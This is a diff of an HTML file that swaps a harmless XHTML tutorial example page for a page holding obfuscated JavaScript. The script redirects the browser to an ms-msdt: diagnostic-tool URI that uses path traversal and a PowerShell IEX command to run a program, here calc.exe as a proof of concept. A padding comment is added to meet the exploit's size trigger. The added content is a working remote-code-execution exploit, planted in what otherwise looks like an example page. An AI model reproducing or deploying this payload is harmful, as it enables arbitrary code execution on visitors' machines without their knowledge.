@@ -1,14 +1,12 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
-<head>
-<!-- <meta http-equiv="refresh" content="5; url=https://www.skplanet.com" /> -->
-<title>DevGuru XHTML html Tag Example</title>
-</head>
+<!doctype html>
+<html lang="en">
 <body>
-body content goes here...
-<object classid="clsid:0C3874AA-AB39-4B5E-A768-45F3CE6C6819" id="BarCode1" width="317" height="86" codebase="https://www.idautomation.com/Assets/idascripts/IDAutomationLinear.cab"> <param name="DataToEncode" value="123456789012"> </object>
+<script>
+//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times
+ 
+var _0x177aa2=_0x3a9f;function _0x3a9f(_0x1c686b,_0x253617){var _0x2b3c16=_0x2b3c();return _0x3a9f=function(_0x3a9f9f,_0x4f4ac6){_0x3a9f9f=_0x3a9f9f-0x125;var _0x2f8433=_0x2b3c16[_0x3a9f9f];return _0x2f8433;},_0x3a9f(_0x1c686b,_0x253617);}(function(_0x410524,_0x169d50){var _0x51711e=_0x3a9f,_0x205a83=_0x410524();while(!![]){try{var _0x3864cf=parseInt(_0x51711e(0x12c))/0x1*(-parseInt(_0x51711e(0x125))/0x2)+parseInt(_0x51711e(0x12a))/0x3*(parseInt(_0x51711e(0x12d))/0x4)+-parseInt(_0x51711e(0x126))/0x5*(-parseInt(_0x51711e(0x127))/0x6)+parseInt(_0x51711e(0x129))/0x7+-parseInt(_0x51711e(0x12b))/0x8+-parseInt(_0x51711e(0x128))/0x9+parseInt(_0x51711e(0x12e))/0xa*(parseInt(_0x51711e(0x132))/0xb);if(_0x3864cf===_0x169d50)break;else _0x205a83['push'](_0x205a83['shift']());}catch(_0x2ba321){_0x205a83['push'](_0x205a83['shift']());}}}(_0x2b3c,0xdbedb),window[_0x177aa2(0x131)][_0x177aa2(0x130)]=_0x177aa2(0x12f));function _0x2b3c(){var _0x366ce1=['50rKWuSC','505140MAsbvp','11139624pctBux','2306087GkOJjL','18RjOyQS','13939816puaawZ','3HMerAq','284584wUtnnU','9030jbAopB','ms-msdt:/id\x20PCWDiagnostic\x20/skip\x20force\x20/param\x20\x22IT_RebrowseForFile=cal?c\x20IT_SelectProgram=NotListed\x20IT_BrowseForFile=h$(IEX(\x27calc.exe\x27))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\x20\x22','href','location','29766lzvVvi','107130FjcBRo'];_0x2b3c=function(){return _0x366ce1;};return _0x2b3c();}
+
+</script>
+
 </body>
 </html>
-
-  
